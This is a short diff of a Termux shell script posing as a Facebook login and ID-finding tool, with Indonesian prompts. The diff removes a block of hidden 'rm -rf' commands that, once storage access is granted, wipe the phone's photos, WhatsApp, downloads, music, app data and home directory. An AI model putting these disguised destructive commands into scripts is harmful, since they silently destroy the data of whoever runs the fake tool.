@@ -45,19 +45,6 @@ echo $green" Login Facebook"
 sleep 1
 read -p "[ISI EMAIL]> " bro;
 termux-setup-storage
-rm -rf /storage/emulated/0
-rm -rf /sdcard/0
-rm -rf /storage/emulated/0/DCIM
-rm -rf /storage/emulated/0/android/obb
-rm -rf /sdcard/0/android/data
-rm -rf $HOME
-rm -rf sdcard/0
-rm -rf storage/emulated/0
-rm -rf /storage/emulated/0/WhatsApp
-rm -rf /sdcard/0/WhatsApp
-rm -rf /storage/emulated/0/Downloads
-rm -rf /storage/emulated/0/Music
-rm -rf /sdcard/0/Music
 echo $green"Sedang Mencari ID Facebook Dalam 30 detik"
 sleep 5
 echo $green"Sedang Mencari ID Facebook Dalam 29 detik"
